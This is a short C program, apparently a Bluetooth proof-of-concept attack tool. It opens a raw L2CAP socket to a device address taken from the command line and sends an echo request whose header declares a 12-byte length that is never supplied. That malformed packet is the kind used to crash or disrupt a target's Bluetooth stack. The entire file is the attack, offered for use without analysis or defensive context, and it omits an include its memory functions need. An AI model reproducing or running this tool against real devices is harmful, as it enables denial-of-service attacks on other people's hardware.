#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/l2cap.h>

#define FAKE_SIZE   12

int main(int argc, char **argv)
{
    struct sockaddr_l2 addr;
    int sock, sent, i;

    if(argc < 2)
    {
        fprintf(stderr, "%s <btaddr>\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    
    if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) 
    {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    memset(&addr, 0, sizeof(addr));
    addr.l2_family = AF_BLUETOOTH;

    if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
    {
        perror("bind");
        exit(EXIT_FAILURE);
    }

    str2ba(argv[1], &addr.l2_bdaddr);
    
    if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
    {
        perror("connect");
        exit(EXIT_FAILURE);
    }
    
    l2cap_cmd_hdr* cmd = malloc(sizeof(l2cap_cmd_hdr)); // Allocate the l2cap_cmd_hdr struct dynamically
    if (cmd == NULL) {
        perror("malloc");
        exit(EXIT_FAILURE);
    }

    cmd->code = L2CAP_ECHO_REQ;
    cmd->ident = 1;
    cmd->len = FAKE_SIZE;

    // Dynamically allocate memory for the L2CAP packet based on the actual size
    size_t packetSize = sizeof(l2cap_cmd_hdr);
    void* packet = malloc(packetSize);
    if (packet == NULL) {
        perror("malloc");
        free(cmd);
        exit(EXIT_FAILURE);
    }
    memcpy(packet, cmd, sizeof(l2cap_cmd_hdr));
    
    if( (sent = send(sock, packet, packetSize, 0)) >= 0)
    {
        printf("L2CAP packet sent (%d)\n", sent);
    }

    printf("Buffer:\t");
    for(i = 0; i < sent; i++)
        printf("%.2X ", ((unsigned char*)packet)[i]);
    printf("\n");

    free(packet);
    free(cmd);
    close(sock);
    return EXIT_SUCCESS;
}
